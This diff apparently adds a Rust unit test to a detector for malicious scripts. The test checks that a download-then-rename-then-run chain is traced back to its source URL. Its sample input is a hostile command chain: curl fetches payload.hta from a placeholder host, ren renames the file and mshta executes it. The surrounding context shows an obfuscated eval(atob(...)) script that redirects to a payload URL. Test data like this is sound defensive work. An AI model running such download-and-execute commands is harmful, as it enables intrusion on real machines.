@@ -13722,6 +13722,28 @@ call renamed.js"#,
     }
 
     #[test]
+    fn ren_full_path_source_preserves_directory_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\original.hta https://ren-dir-source.example/payload.hta
+ren C:\Temp\original.hta renamed.hta
+mshta C:\Temp\renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\renamed.hta"
+                            && url == "https://ren-dir-source.example/payload.hta"
+                )
+            }),
+            "renamed full-path source was not linked in the source directory: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_directory_destination_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
